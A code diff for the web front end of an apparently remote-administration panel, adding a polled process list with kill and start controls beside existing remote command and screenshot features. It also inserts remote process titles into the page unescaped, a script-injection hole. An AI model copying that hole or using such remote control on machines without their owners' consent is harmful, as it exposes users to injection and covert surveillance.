@@ -1,67 +1,14 @@
 
-const hideSpinners = () => {
-    const systemSpinner = document.querySelectorAll(".systemSpinner");
-    for (let i=0; i < systemSpinner.length; i++) {
-        systemSpinner[i].style.display = 'none';
-    }
+window.onload = () => {
+    setInterval(() => {
+        sio.emit("process_list", {clientId: clientId});
+    }, 2000);
 }
 
-/*const parseData = (el, data, multi=false) => {
-    let htmlData = '';
-    if (multi) {
-        data.map(item => {
-            for (const [key, value] of Object.entries(item)) {
-                htmlData += `${key}: ${value}` + "<br>";
-            }
-        })
-    } else {
-        for (const [key, value] of Object.entries(data)) {
-            htmlData += `${key}: ${value}` + "<br>";
-        }
-    }
-
-    el.innerHTML = htmlData;
+const hideSpinner = (id) => {
+    document.getElementById(id).style.display = "none";
 }
 
-const generateSystemInfo =  (data) => {
-    const osInfo = document.getElementById('osInfo');
-    const cpuInfo = document.getElementById('cpuInfo');
-    const gpuInfo = document.getElementById('gpuInfo');
-    const diskInfo = document.getElementById('diskInfo');
-    hideSpinners();
-
-    const osData = data.os;
-    const cpuData = data.cpu;
-    const gpuData = data.gpu;
-    const diskData = data.disk;
-
-    parseData(osInfo, osData);
-    parseData(cpuInfo, cpuData);
-    parseData(gpuInfo, gpuData, true);
-    parseData(diskInfo, diskData, true);
-}
-//const osInfoFromLS = JSON.parse(localStorage.getItem('systemInfo'));
-(async () => {
-    const clientData = await findClientInLocalStorage(clientId);
-    console.log(clientData);
-    console.log(clientId);
-    if (!clientData) {
-        await addClientToLocalStorage(clientId);
-        sio.emit('getSystemInfoFromClient', {clientId: clientId});
-    }
-    else
-    {
-        if (Object.keys(clientData.details).length === 0) {
-            sio.emit('getSystemInfoFromClient', {clientId: clientId});
-        }
-        else
-        {
-            generateSystemInfo(clientData.details);
-        }
-    }
-
-})();
-*/
 const getFormData  = (target) => {
     const formData = new FormData(target)
     let data = {};
@@ -82,6 +29,9 @@ const commandResult = document.getElementById('commandResult');
 const commandFormBtnClear = document.getElementById('commandFormBtnClear');
 const selectCommands = document.getElementById('selectCommands');
 const commandInput = document.querySelector('input[name="command"]')
+const processList = document.getElementById('processList');
+const processTable = document.getElementById('processTable');
+const processForm = document.getElementById('processForm');
 
 manageBtnScreenShoot.addEventListener('click', (e) => {
     sio.emit('screenshoot', {clientId: clientId});
@@ -100,6 +50,14 @@ commandForm.addEventListener('submit', (e) => {
     const data = getFormData(e.target);
     console.log(data);
     sio.emit('command', data);
+})
+
+processForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    console.log('Process');
+    const data = getFormData(e.target);
+    console.log(data);
+    sio.emit('process_start', data);
 })
 
 commandFormBtnClear.addEventListener('click', (e) => {
@@ -155,6 +113,34 @@ sio.on('command', (data) => {
 
     resultBody.textContent = data.message;
     commandResult.append(resultBody);
+})
+
+const killProcess = (processId) => {
+    console.log(processId);
+    sio.emit("process_kill", {clientId: clientId, processId: processId});
+}
+
+sio.on("process_list", (data) => {
+    console.log(data);
+    let processHtml = '';
+    data.processes.map(process => {
+
+        processHtml += `
+            <tr>
+                <td>${process.MainWindowTitle}</td>
+                <td>${process.Name}</td>
+                <td>${process.Id}</td>
+                <td>
+                    <div class="uk-inline">
+                        <button class="uk-button uk-button-default" type="button" onclick="killProcess(${process.Id})">Zakoncz</button>
+                    </div>
+                </td>
+            </tr>
+        `;
+    })
+    processList.innerHTML = processHtml;
+    processTable.style.display = "block";
+    hideSpinner('processSpinner');
 })
 
 sio.on('client_disconnected', (data) => {
